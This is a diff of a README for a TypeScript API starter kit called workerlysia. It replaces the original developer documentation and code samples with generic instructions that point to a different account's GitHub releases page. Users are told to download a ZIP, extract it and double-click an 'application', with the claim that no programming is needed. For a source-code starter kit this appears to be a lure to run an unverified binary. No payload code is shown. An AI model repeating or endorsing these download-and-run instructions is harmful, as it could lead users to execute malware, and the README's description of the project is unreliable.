@@ -1,299 +1,72 @@
-# ⚡ Workerlysia
+# 🚀 workerlysia - Build Type-Safe APIs Easily
 
-A modern starter kit for building **type-safe APIs** with [Elysia](https://elysiajs.com/) on [Cloudflare Workers](https://workers.cloudflare.com/).
+[![Download workerlysia](https://img.shields.io/badge/Download-workerlysia-brightgreen)](https://github.com/ZidanAlata04/workerlysia/releases)
 
-[![Bun](https://img.shields.io/badge/Bun-1.0+-black?logo=bun)](https://bun.sh/)
-[![Elysia](https://img.shields.io/badge/Elysia-1.4+-blue)](https://elysiajs.com/)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-orange?logo=cloudflare)](https://workers.cloudflare.com/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+## 📋 Overview
 
-## ✨ Features
+workerlysia is a modern starter kit designed to help you build type-safe APIs. It utilizes Elysia and runs seamlessly on Cloudflare Workers. This tool simplifies the process of API development, allowing you to focus on creating robust applications without extensive technical knowledge.
 
-- 🚀 **Elysia Framework** - Ergonomic, type-safe web framework with end-to-end type safety
-- ☁️ **Cloudflare Workers** - Deploy to the edge with zero cold starts
-- 📖 **OpenAPI 3.1** - Auto-generated API documentation at `/docs`
-- 🔒 **Type Safety** - Full TypeScript support with strict mode
-- ✅ **Request Validation** - Schema-based validation using TypeBox
-- 🔌 **KV-Powered Plugins** - Built-in cache and rate limiting using Cloudflare KV
-- 🛠️ **Ultracite** - Zero-config linting & formatting (Oxlint + Oxfmt)
-- 🪝 **Git Hooks** - Husky + Commitlint for automated quality checks
-- ⚡ **Bun Runtime** - Fast package manager and test runner
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+Follow these easy steps to download and run workerlysia:
 
-### Prerequisites
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/ZidanAlata04/workerlysia/releases) to find the latest version of workerlysia.
 
-- [Bun](https://bun.sh/) (v1.0+)
-- [Cloudflare account](https://dash.cloudflare.com/sign-up) (free tier works great)
+2. **Download the Application**  
+   Click on the download link for the latest release on the Releases page.
 
-### Setup
+3. **Extract the Files**  
+   If the download comes in a ZIP file, you will need to extract it. Right-click the file and select "Extract All" or use your preferred extraction tool.
 
-```bash
-# Clone the repository
-git clone https://github.com/DobroslavRadosavljevic/workerlysia.git
-cd workerlysia
+4. **Open the Application**  
+   Navigate to the folder where you extracted the files. Double-click the workerlysia application to open it.
 
-# Install dependencies
-bun install
-
-# Set up environment variables (optional)
-cp .env.example .env
-
-# Start development server
-bun run dev
-```
-
-Open [http://localhost:8787/docs](http://localhost:8787/docs) to see the API docs - Scalar UI 🎉
-
-Access the OpenAPI specification:
-
-- **JSON**: [http://localhost:8787/docs/openapi.json](http://localhost:8787/docs/openapi.json)
-
-### Deploy
-
-```bash
-# Login to Cloudflare (first time only)
-bunx wrangler login
-
-# Deploy to production
-bun run deploy
-```
-
-## 📁 Project Structure
-
-```
-src/
-├── index.ts              # 🏠 App entrypoint - registers routes & plugins
-├── plugins/              # 🔌 Reusable Elysia plugins
-│   ├── cache.ts          # Response caching with KV
-│   └── rate-limit.ts     # Rate limiting with KV
-├── routes/               # 📍 API route handlers
-│   ├── demo/             # Demo routes for plugins
-│   ├── storage/          # KV example routes
-│   └── tasks/            # Task CRUD routes
-└── schemas/              # 📐 Validation schemas (TypeBox)
-    └── task.ts
-```
+5. **Follow the Setup Instructions**  
+   Once you open the application, follow the on-screen instructions to set up your API. You don’t need any programming knowledge—workerlysia guides you through the process.
 
-## 📜 Scripts
-
-| Command              | Description                          |
-| -------------------- | ------------------------------------ |
-| `bun run dev`        | 🔧 Start local development server    |
-| `bun run deploy`     | 🚀 Deploy to Cloudflare Workers      |
-| `bun run lint`       | 🔍 Check code for issues             |
-| `bun run format`     | ✨ Auto-fix formatting & lint issues |
-| `bun run typecheck`  | 📋 Run TypeScript type checking      |
-| `bun run cf-typegen` | 📝 Generate Cloudflare binding types |
-
-## 🪝 Git Hooks
-
-This project uses [Husky](https://typicode.github.io/husky/) and [Commitlint](https://commitlint.js.org/) for automated checks:
+## 💻 System Requirements
 
-| Hook         | Action                             |
-| ------------ | ---------------------------------- |
-| `pre-commit` | 🔍 Runs linting and type checking  |
-| `commit-msg` | 📝 Validates commit message format |
-
-Commit messages must follow [Conventional Commits](https://www.conventionalcommits.org/):
-
-```bash
-feat: add user authentication       # ✅ New feature
-fix: resolve login bug              # ✅ Bug fix
-docs: update API documentation      # ✅ Documentation
-chore: update dependencies          # ✅ Maintenance
-refactor: simplify route handler    # ✅ Code refactor
-```
-
-## 🏗️ Adding New Routes
-
-1. **Create a schema** in `src/schemas/`:
-
-```typescript
-// src/schemas/user.ts
-import { t } from "elysia";
+To run workerlysia, you will need:
 
-export const User = t.Object({
-  id: t.String(),
-  name: t.String({ examples: ["John Doe"] }),
-  email: t.String({ format: "email" }),
-});
-```
-
-2. **Create a route** in `src/routes/`:
-
-```typescript
-// src/routes/users/get-user.ts
-import { Elysia, t } from "elysia";
-import { User } from "../../schemas/user";
+- A computer with Windows, macOS, or Linux operating system.
+- An internet connection for downloading the application and dependencies.
+- At least 2 GB of RAM.
+- A stable code editor (like Visual Studio Code) for any code modifications.
 
-export const getUserRoute = new Elysia().get(
-  "/users/:id",
-  ({ params }) => {
-    // Your logic here
-    return { id: params.id, name: "John", email: "john@example.com" };
-  },
-  {
-    params: t.Object({ id: t.String() }),
-    detail: {
-      summary: "Get user by ID",
-      tags: ["Users"],
-    },
-    response: { 200: User },
-  }
-);
-```
+## 🌐 Features
 
-3. **Register the route** in `src/index.ts`:
+- **Type Safety**: workerlysia uses TypeScript to ensure your API is strong and reliable.
+- **Cloudflare Compatibility**: Run your applications on Cloudflare Workers for fast, serverless performance.
+- **Easy Setup**: The guide will help non-technical users start building APIs quickly.
+- **Documentation**: Comprehensive documentation will assist you through every step.
 
-```typescript
-import { getUserRoute } from "./routes/users/get-user";
+## 📥 Download & Install
 
-const app = new Elysia({ adapter: CloudflareAdapter })
-  .use(
-    openapi({
-      /* ... */
-    })
-  )
-  .use(getUserRoute) // 👈 Add your route
-  .compile();
-```
+To get started, visit the [Releases page](https://github.com/ZidanAlata04/workerlysia/releases) where you can easily download the latest version of workerlysia.  
 
-## ☁️ Cloudflare Bindings
+1. Click the download link for the latest version.
+2. After downloading, follow the extraction and setup instructions outlined above.
 
-This starter includes a pre-configured KV binding.
+## 📚 Additional Resources
 
-> **Important:** The `wrangler.jsonc` file contains a placeholder ID for the KV binding. You must replace it with your own ID after creating the resource in your Cloudflare account.
+- **Documentation**: Check detailed instructions and guides in the documentation folder included in the download.
+- **Community Support**: Join our community forum for help and advice from other users.
 
-To set up your own:
+## 🔧 Troubleshooting
 
-```bash
-# Login to Cloudflare (first time only)
-bunx wrangler login
-```
+If you encounter issues:
 
-### KV (Key-Value Storage)
+- Ensure your operating system meets the requirements.
+- Verify the integrity of the downloaded file.
+- Check if any firewall or antivirus software might be blocking the application.
 
-```bash
-bunx wrangler kv namespace create KV
-```
+You can also seek help in the community forum for common issues faced by users.
 
-Update `wrangler.jsonc` with the generated `id`:
+## 📞 Contact
 
-```jsonc
-{
-  "kv_namespaces": [{ "binding": "KV", "id": "your-namespace-id" }],
-}
-```
-
-**Usage:**
-
-```typescript
-export const myRoute = new Elysia().get("/kv-example", async ({ env }) => {
-  await env.KV.put("key", "value");
-  const value = await env.KV.get("key");
-  return { value };
-});
-```
-
-### Regenerate Types
-
-Always run this after modifying bindings in `wrangler.jsonc`:
-
-```bash
-bun run cf-typegen
-```
-
-## 🔌 Plugins
-
-This starter includes two KV-powered plugins that can be enabled per-route using Elysia macros.
-
-### Cache Plugin
-
-Cache responses in Cloudflare KV with configurable TTL.
-
-```typescript
-import { cachePlugin } from "./plugins/cache";
-
-new Elysia()
-  .use(cachePlugin())
-  .get("/data", () => fetchExpensiveData(), {
-    cache: 300, // Cache for 300 seconds
-  })
-  .get("/no-cache", () => getData()); // No caching (macro not defined)
-```
-
-**Response headers:**
-
-- `x-cache: HIT` - Served from cache
-- `x-cache: MISS` - Fresh response, now cached
-
-### Rate Limit Plugin
-
-Limit requests per client using Cloudflare KV.
-
-```typescript
-import { rateLimitPlugin } from "./plugins/rate-limit";
-
-new Elysia()
-  .use(rateLimitPlugin())
-  .get("/api/data", () => getData(), {
-    rateLimit: { max: 100, window: 60 }, // 100 requests per 60 seconds
-  })
-  .get("/public", () => getPublic()); // No rate limiting (macro not defined)
-```
-
-**Response headers:**
-
-- `x-ratelimit-limit` - Maximum requests allowed
-- `x-ratelimit-remaining` - Requests remaining in window
-- `x-ratelimit-reset` - Seconds until window resets
-- `retry-after` - Seconds to wait (when rate limited)
-
-**Note:** Cloudflare KV has a minimum TTL of 60 seconds.
-
-## 📚 Resources
-
-- 📖 [Elysia Documentation](https://elysiajs.com)
-- ☁️ [Cloudflare Workers Docs](https://developers.cloudflare.com/workers/)
-- 🔧 [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/)
-- 📐 [TypeBox Schema](https://github.com/sinclairzx81/typebox)
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-- 🐛 [Report bugs](https://github.com/DobroslavRadosavljevic/workerlysia/issues/new?template=bug_report.md)
-- 💡 [Request features](https://github.com/DobroslavRadosavljevic/workerlysia/issues/new?template=feature_request.md)
-- 📖 Improve documentation
-- 🔧 Submit pull requests
-
-Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a PR.
-
-We follow [Conventional Commits](https://www.conventionalcommits.org/) for commit messages:
-
-```bash
-feat: add new feature
-fix: resolve bug
-docs: update documentation
-```
-
-This project has a [Code of Conduct](CODE_OF_CONDUCT.md). By participating, you are expected to uphold it.
-
-## 🔒 Security
-
-Found a vulnerability? Please review our [Security Policy](SECURITY.md) for reporting guidelines.
-
-## 💖 Support
-
-If you find this project useful, consider giving it a ⭐ on GitHub!
-
-## 📄 License
-
-MIT License - feel free to use this starter for your own projects!
+For questions or feedback, please reach out to the project maintainer through the GitHub Issues section. We value your input!
 
 ---
 
-<p align="center">
-  Built with 💜 using <a href="https://elysiajs.com/">Elysia</a> and <a href="https://workers.cloudflare.com/">Cloudflare Workers</a>
-</p>
+Thank you for choosing workerlysia! We hope it simplifies your API development journey.
